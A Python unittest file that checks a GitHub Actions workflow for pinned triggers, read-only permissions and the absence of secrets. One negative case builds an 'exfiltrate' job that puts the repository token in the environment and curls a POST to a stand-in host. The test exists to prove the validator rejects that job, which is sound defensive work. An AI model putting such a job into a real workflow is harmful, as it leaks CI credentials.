"""Contrato del caller local V3: jamás convertir observación en release."""

from pathlib import Path
import re
import unittest


CALLER = (Path(__file__).resolve().parents[1] / ".github/workflows" /
          "observador-reservas-consumidor.yml")
PERMISSIONS = {"contents", "issues", "pull-requests", "checks", "actions"}
REUSABLE = "pl0n3r/Factory/.github/workflows/observador-reservas-consumidor.yml@v1"


class ObservadorReservasConsumidorTests(unittest.TestCase):
    def _verify_events(self, text):
        self.assertEqual(1, len(re.findall(r"(?m)^on:$", text)))
        self.assertRegex(text, r"(?m)^on:\n  schedule:\n    - cron: '\*/10 \* \* \* \*'\n  workflow_dispatch:\n\npermissions:$")
        self.assertEqual([REUSABLE], re.findall(r"(?m)^    uses: ([^\n]+)$", text))
        self.assertEqual(1, len(re.findall(r"(?m)^jobs:$", text)))
        self.assertEqual(1, len(re.findall(r"(?m)^  observe:$", text)))
        job_section = text.split("\njobs:\n", 1)[1]
        self.assertEqual(
            ["observe"],
            re.findall(r"(?m)^  ([A-Za-z][A-Za-z0-9_-]*):(?: *#.*)?$", job_section),
        )
        for forbidden in ("push:", "pull_request:", "pull_request_target:",
                          "issue_comment:", "repository_dispatch:", "workflow_run:",
                          "workflow_call:"):
            with self.subTest(forbidden=forbidden):
                self.assertNotRegex(text, r"(?m)^  " + re.escape(forbidden) + r"$")

    def test_events_and_reusable_exact_v1(self):
        text = CALLER.read_text(encoding="utf-8")
        self._verify_events(text)
        wrong_ref = text.replace("@v1", "@main")
        wrong_event = text.replace("  workflow_dispatch:", "  pull_request:")
        with self.assertRaises(AssertionError):
            self._verify_events(wrong_ref)
        with self.assertRaises(AssertionError):
            self._verify_events(wrong_event)

    def _verify_read_only(self, text):
        self.assertEqual(2, len(re.findall(r"(?m)^(?:permissions:|    permissions:)$", text)))
        scopes = re.findall(r"(?m)^(  |      )(contents|issues|pull-requests|checks|actions): (\w+)$", text)
        self.assertEqual(10, len(scopes))
        for indent in ("  ", "      "):
            self.assertEqual(PERMISSIONS, {name for spacing, name, value in scopes
                                           if spacing == indent and value == "read"})
        self.assertNotRegex(text, r"(?m)^\s*[\w-]+: write$")
        self.assertNotRegex(text, r"(?m)^\s*(?:-\s*)?(?:secrets|with|run|steps|env|environment):")
        self.assertIn("group: lease-consumer-caller-${{ github.repository_id }}", text)
        self.assertIn("cancel-in-progress: false", text)
        self.assertIn("name: Observar reservas locales, sin liberar", text)
        self.assertNotIn("FACTORY_LEASE_AUTO_RELEASE_ENABLED: 'true'", text)

    def test_read_only_permissions_and_serial_execution(self):
        text = CALLER.read_text(encoding="utf-8")
        self._verify_read_only(text)
        for unsafe in (text.replace("contents: read", "contents: write", 1),
                       text.replace("cancel-in-progress: false", "cancel-in-progress: true"),
                       text + "\n    secrets: inherit\n",
                       text + (
                           "\n  exfiltrate:\n"
                           "    runs-on: ubuntu-latest\n"
                           "    env:\n"
                           "      TOKEN: ${{ secrets.GITHUB_TOKEN }}\n"
                           "    steps:\n"
                           "      - run: curl -X POST https://example.invalid/upload\n"
                       )):
            with self.subTest(unsafe=unsafe[-45:]):
                with self.assertRaises(AssertionError):
                    self._verify_read_only(unsafe)


if __name__ == "__main__":
    unittest.main()
